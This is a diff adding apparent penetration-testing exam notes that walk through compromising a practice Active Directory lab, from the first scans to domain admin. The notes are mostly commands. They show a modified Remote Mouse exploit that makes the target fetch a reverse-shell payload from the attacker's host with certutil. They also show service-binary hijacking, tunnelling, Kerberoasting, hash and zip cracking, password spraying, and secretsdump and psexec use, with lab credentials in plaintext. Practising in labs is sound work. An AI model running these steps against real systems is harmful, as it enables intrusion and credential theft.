@@ -1,0 +1,46 @@
+Path #1
+VPN:
+cd Desktopmkdir ad_labcd ad_labmkdir vpn ms01 ms02 dc01llcd vpnmv ~/Downloads/profile.ovpn .llsudo OpenVPN *.ovpn
+---------------------------------------------------------------------------------
+Scan Hosts:
+cd Desktop/ad_lab/ms01llmkdir enu loot files exploitsll
+Try to Ping to see if the firewall is on.sudo vim /etc/hosts- 192.168.100.201 ms01- 10.10.1.202 ms02- 10.10.1.200 dc01
+ping -c 2 ms01
+
+ICMP may be blocked. Try nmap.
+sudo nmap -T4 -p- -v ms01 -oN enu/nmap-ports.log
+(Since Port 80 is open, we will try directory brute forcing /usr/share/wordlists/)(Since Port 1978, 1979, and 1980 are open, we will enumerate the sql dbs)
+We will also do a service/version scan on the open ports:sudo nmap -T4 -p80,443,1978-1980 -sCV -v ms01 -oN enu/nmap-services.log- We found SIN 15win nop nop 300 when fingerprinting unisql (port 1978) and pearldoc-xact (port 1980)- Note: Create a script to find patterns that appear across multiple ports-----------------------------------------------------------------------------------
+Directory Brute Forcing:
+cd Desktop/ad_lab/ms01gobuster dir -u http://ms01 -w /usr/share/dirb/wordlists/common.txt | tee enu/gobuster-p80.log
+Run without "tee" for colors.
+gobuster dir -u http://ms01 -w /usr/share/dirb/wordlists/common.txt
+Open all the pages that exist and don't give a 403.
+We have an uploads directory (Status: 301).Go to: ms01/uploads, download any files and view the metadata.- mv ~/Downloads/file.exe .- exiftool file.exe (Look for software names/version numbers)--- We found Remote Mouse 3.008
+---------------------------------------------------------------------------------
+Remote Mouse:searchsploit remote mouse 3.008cd ../exploitssearchsploit -x 46697(We find the same "SIN 15win nop nop 300" that we found when fingerprinting)(This is the line in the script that needs to be updated: "SendString("calc.exe",ip)")- Note: You can also use "strings" on an executable.
+mkdir ~/Desktop/ad_lab/payloadscd ~/Desktop/ad_lab/payloadsmsfvenom -p windows/x64/shell_reverse_tcp LHOST=172.16.11.11 LPORT=443 -f exe -o winrev443.exe(Note, we used 443 because it seems the firewall is on (given the ping did not succeed)llpython -m http.server 80cd ~/Desktop/ad_lab/exploits/searchsploit -m 46697vim 46697.pyChange "calc.exe" to: "certutil.exe -urlcache -f http://172.16.11.11/winrev443.exe \users\public\winrev443.exe"(You can also save it to \windows\temp)python2 46697.py(It tells us we are missing a variable)python2 46697.py ms01(Wait a while, until our python3 http server serves the executable)Comment out the line in the exploit and add the following line below:Change "calc.exe" to: "\users\public\winrev443.exe"nc -nvlp 443whoami(We are a local account, not a domain account)whoami /priv(SeShutdownPrivilege) is present (even though not enabled. This means we can restart the machine to potentially trigger service execution.)net localgroup Administrators(We see "OSCP\Domain Admins". That means this is a domain joined machine.)--------------------------------------------------------------------------------
+Winpeas
+cd ~/Desktop/ad_lab/ms01/payloadsmv /Downloads/winPEASx64.exe ./winpeas.exepython -m http.server 80certuril.exe -urlcache -f http://172.16.11.11/winpeas.exe winpeas.exewinpeas.exe(Anything in Red, worth looking at. Especially vulnerabilities, cached logons, users (local admin, logged on), powershell history. If only NTLMv2 is enabled, we won't be able to pass the hashes)(For WiseBootAssistant, we see "No quotes or space detected and file permissions that all authenticated users can overwrite. (C:\apps\Wise\Wise.exe is the exploitable path))sc query | findstr /i wisesc qc wisebootassistant(We should get a shell as local system)cd C:\apps\wisecopy \users\public\win443.exe .\Wise.exeshutdown -r -t 0nc -nvlp 443whoami
+------------------------------------------------------------------------------Proof.txtdir /s /b proof.txttype C:\Users\Administrator\Desktop\proof.txtwhoamiipconfighostname(Take a screenshot of this, for your exam)
+-------------------------------------------------------------------------------
+Pivoting:dir C:\Userscd C:\Users\wyldstyletree /f /adir /s/b *.logtype C:\Users\wyldstyle\AppData\Roaming\Microsoft\Windows\PowerShell\PsReadLine\ConsoleHost_history.txt(We see this in the PowerShell History:$pass = ConvertTo-SecureString "Awesome24!" -AsPlainText -Force$cred = New-Object System.Management.Automation.PSCredential("wyldstyle",$pass)Enter-PSSession -ComputerName MS03 -Credential $cred)(Save the credentials to a local file)cd ~/Downloadsll7z x ligolo-ng_agent_0.4.4_windows_amd64.zipllmv agent.exe ~/Desktop/ad_lab/payloadsgunzip -d ligolo-ng_agent_0.4.4_linux_amd64.zipllsudo mv proxy /usr/bin/llrm ./*llproxy --helpsudo ip tuntap add user kali mode tun ligolosudo ip link set ligolo upifconfigcd ~/Desktop/ad_lab/payloadsllsudo python -m http.server 80proxy -selfcertcd C:\Users\Publiccertutil.exe -urlcache -f http://172.16.11.11/agent.exe agent.exeagent.exe -connect 172.16.11.11:11601 -retry -ignore-certsession1ifconfigstartsudo ip route add 10.10.1.0/24 dev ligoloip route-----------------------------------------------------------------------------
+Internal Network Enumeration:cd Desktop/ad_lab/dc01mkdir enu loot files exploitsping -c 2 dc01sudo nmap -T4 -p- -sCV --open -v dc01 -oN enu/nmap-ports-versions.log(Port 445 is open)cd Desktop/ad_lab/ms02mkdir enu files loot exploitssudo nmap -p- -sCV -v ms02 -oN enu/nmap-ports-versions.log(Port 135, 445, and 135 are open)(Although the output file name is the same, we are in a different directory)cd Desktop/ad_lab/dc01smbclient -L //dc01 -U oscp/wyldstyle(We find a non-default share: "backups")smbclient //dc01 -U oscp/wyldstyledir(ACCESS DENIED!!)exitsmbclient -L //ms02 -U oscp/wyldstyle(We find a non-default share: "setup")smbclient //ms02 -U oscp/wyldstyle
+cd ~/Desktop/ad_lab/dc01impacket-GetUserSPNs -request -dc-ip dc01 oscp.lab/wyldstylevim hashescat hasheshashid hashes
+impacket-GetNPUsers -request -dc-ip dc01 oscp.lab/wyldstylevim hashes.asrepcat hashes.asrep
+hashcat hashes.asrep /usr/share/wordlists/rockyou.txthashcat hashes.asrep /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule(UNSUCCESSFUL CRACKING OF METALBEARD's AS REP ROAST HASH!)hashcat hashes /usr/share/wordlists/rockyou.txt(Successful cracking of svc_iis service account password: Portland7@)
+crackmapexecvim users(Add wyldstyle and svc_iis)vim passwords(Add Awesome24! and Portland7@)
+crackmapexec smb 10.10.1.200 -u users -p passwords --continue-on-success(We can log on to DC01 as either user, but without admin access)crackmapexec smb 10.10.1.202 -u users -p passwords --continue-on-success(We can log on to MS02 as either user, but without admin access)
+smbclient //dc01/backups -U oscp/svc_iisdirget it-users.zipexitllmv it-users.zip dc01/filescd dc01/filesll7z x it-users.zipqllzip2john it-users.zip > it-users.hashcat it-users.hashjohn it-users.hash --wordlist=/usr/share/wordlists/rockyou.txt(We got the password: T.BRICK14)7z x it-users.zipcat it-users.txt(We got:superman:Sup3rH3r0!goodcop:GoodC0pRocksbadcop:BadC0pMeanie!wonderwoman:W0nderW0m@nAma@zonemmet:R3xRul3z!)
+cat it-users.txt | cut -d ':' -f 1 > userscat it-users.txt | cut -d ':' -f 2 > passwordcrackmapexec smb 10.10.1.200-10.10.1.202 -u users -p passwords -d oscp.lab --continue-on-success(We got a hit for oscp.lab\emmet:R3xRul3z! on DC01)(We got a Pwned! hit for oscp.lab\emmet:R3xRul3z! on MS02)
+------------------------------------------------------------------------------------
+Lateral Movement
+impacket-psexec oscp/emmet@10.10.1.202whoamihostnamecd \users\dircd lord_businessdircd Desktopdirtype proof.txtwhoamiipconfighostname(Take a screenshot of this, for your exam)exitcd ~/Desktop/ad_lab/ms02/lootvim proof.txt
+impacket-psexec oscp/emmet@10.10.1.202dir /s/b lord_business\*.txtnet usernet user /domainnet user lord_business /domain(lord_business is a domain admin!)
+cd ~/Desktop/ad_lab/ms02/enuimpacket-secretsdump oscp/emmet@10.10.1.202(We got lord_business's hash and plaintext password!)
+evil-winrm -i 10.10.1.200 -u lord_business -p TAKOStuesday!tree /f /a Administratorcd administrator\Desktoptype proof.txtwhoamiipconfighostnamedownload proof.txtexitmv proof.txt ../../dc01/lootcd ../../dc01/lootcat proof.txt-------------------------------------------------------------------
+Web App Enumeration:
+Go to: http://ms01
+It redirects to: "http://ms01/dashboard/" XAMPP Apache
+Go to ms01/phpMyAdmin/(Even if you get a code 403 (Forbidden), the page may tell you the apache version and open ssl version).
+Go to ms01/dashboard/phpinfo.php, for more information about the application stack, including the DOCUMENT_ROOT
